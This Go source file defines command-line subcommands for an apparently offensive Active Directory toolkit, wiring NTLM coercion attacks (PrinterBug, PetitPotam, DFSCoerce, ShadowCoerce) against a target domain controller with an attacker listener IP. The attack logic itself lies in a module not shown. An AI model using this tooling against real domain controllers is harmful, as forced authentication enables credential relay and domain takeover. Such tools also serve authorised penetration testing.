package cmd

import (
	"adpack/modules"
	"github.com/spf13/cobra"
)

var coerceTarget, coerceListen string

var coerceCmd = &cobra.Command{Use: "coerce", Short: "NTLM coercion attacks"}

var coercePrinterBugCmd = &cobra.Command{
	Use: "printerbug", Short: "MS-RPRN PrinterBug coercion",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.CoercionManager{}).PrinterBug(coerceTarget, coerceListen)
	},
}
var coercePetitPotamCmd = &cobra.Command{
	Use: "petitpotam", Short: "MS-EFSR PetitPotam coercion",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.CoercionManager{}).PetitPotam(coerceTarget, coerceListen)
	},
}
var coerceDFSCoerceCmd = &cobra.Command{
	Use: "dfscoerce", Short: "MS-DFSNM DFSCoerce",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.CoercionManager{}).DFSCoerce(coerceTarget, coerceListen)
	},
}
var coerceShadowCmd = &cobra.Command{
	Use: "shadow", Short: "MS-FSRVP ShadowCoerce",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.CoercionManager{}).ShadowCoerce(coerceTarget, coerceListen)
	},
}
var coerceAllCmd = &cobra.Command{
	Use: "all", Short: "Coercer scanner (all methods)",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.CoercionManager{}).All(coerceTarget, coerceListen)
	},
}

func init() {
	for _, c := range []*cobra.Command{coercePrinterBugCmd, coercePetitPotamCmd, coerceDFSCoerceCmd, coerceShadowCmd, coerceAllCmd} {
		c.Flags().StringVar(&coerceTarget, "target", "", "Target DC IP/hostname")
		c.Flags().StringVar(&coerceListen, "listen", "", "Attacker listener IP")
	}
	coerceCmd.AddCommand(coercePrinterBugCmd, coercePetitPotamCmd, coerceDFSCoerceCmd, coerceShadowCmd, coerceAllCmd)
	rootCmd.AddCommand(coerceCmd)
}
